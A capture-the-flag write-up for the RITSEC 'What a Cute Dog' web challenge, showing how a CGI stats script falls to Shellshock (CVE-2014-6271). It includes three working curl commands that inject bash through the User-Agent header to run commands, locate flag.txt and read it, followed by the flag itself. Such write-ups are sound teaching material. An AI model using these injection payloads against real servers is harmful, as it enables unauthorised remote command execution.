## What a Cute Dog - Web 350:  

**Description:** This dog is shockingly cute!  
**Challenge:** fun.ritsec.club:8008  
**Difficulty:** Easy  
**Solved by:** Milan  

**Solution:**  
Upon opening the given URL, we see a shockingly cute dog ! And some stats: **Mon Nov 19 11:06:51 UTC 2018 11:06:51 up 2 days, 18:54, 0 users, load average: 0.00, 0.00, 0.03**.  
Inspecting the source we see an interesting link: **http://fun.ritsec.club:8008/cgi-bin/stats**. Googling this, we found an exploit for stats. And guess what, it is a **shellshock exploit (CVE 2014-6271)**.  

We are going to use this command for finding the flag: **curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'uname -a;'" http://fun.ritsec.club:8008/cgi-bin/stats**  

After some time for searching the flag, I remembered that flag it is always named like **flag.txt**. So I ran this command in terminal to get the exact location of a flag:
**curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -name flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats**

**flag.txt** was found in **/opt/** folder. The final step we needed to take was to read the flag.  
**curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /opt/flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats**

**Flag:**  
RITSEC{sh3ll_sh0cked_w0wz3rs}
